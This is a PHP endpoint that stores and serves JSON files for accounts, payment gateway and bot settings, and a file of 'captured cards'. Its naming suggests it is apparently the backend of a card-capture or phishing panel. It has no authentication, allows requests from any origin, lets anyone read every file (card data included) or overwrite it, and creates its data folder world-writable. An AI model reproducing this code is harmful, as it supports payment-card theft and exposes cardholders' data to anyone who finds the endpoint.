<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Directory to store data
$dataDir = __DIR__ . '/../data/';
if (!file_exists($dataDir)) {
    mkdir($dataDir, 0777, true);
}

// File paths
$files = [
    'accounts' => $dataDir . 'accounts.json',
    'siteSettings' => $dataDir . 'site_settings.json',
    'subscriptionPrices' => $dataDir . 'prices.json',
    'tribopayConfig' => $dataDir . 'tribopay.json',
    'ravenbotConfig' => $dataDir . 'ravenbot.json',
    'paymentControls' => $dataDir . 'payment_controls.json',
    'capturedCards' => $dataDir . 'captured_cards.json'
];

// Helper to read data
function readData($file) {
    if (!file_exists($file)) {
        return null;
    }
    $content = file_get_contents($file);
    return json_decode($content, true);
}

// Helper to save data
function saveData($file, $data) {
    return file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

// Handle GET requests
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $type = $_GET['type'] ?? '';
    
    if (isset($files[$type])) {
        $data = readData($files[$type]);
        echo json_encode($data);
    } else {
        // Return all data if no type specified or 'all'
        $allData = [];
        foreach ($files as $key => $path) {
            $allData[$key] = readData($path);
        }
        echo json_encode($allData);
    }
    exit;
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $type = $input['type'] ?? '';
    $data = $input['data'] ?? null;

    if (isset($files[$type]) && $data !== null) {
        if (saveData($files[$type], $data)) {
            echo json_encode(['success' => true]);
        } else {
            http_response_code(500);
            echo json_encode(['error' => 'Failed to save data']);
        }
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid type or missing data']);
    }
    exit;
}
?>
